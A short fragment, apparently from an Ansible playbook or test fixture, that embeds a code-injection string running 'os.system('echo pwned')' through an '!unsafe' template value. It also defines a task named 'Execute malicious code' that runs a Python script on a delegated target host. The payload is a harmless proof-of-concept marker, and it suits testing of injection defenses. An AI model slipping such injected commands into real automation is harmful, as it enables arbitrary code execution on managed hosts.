                  "!unsafe \"[d]\",{d:\\\'import os; os.system(\\\'echo pwned\\\')\\\'}"
  tasks:
    - name: Execute malicious code
      delegate_to: "{{ target }}"
      command: python /tmp/malicious_code.py
  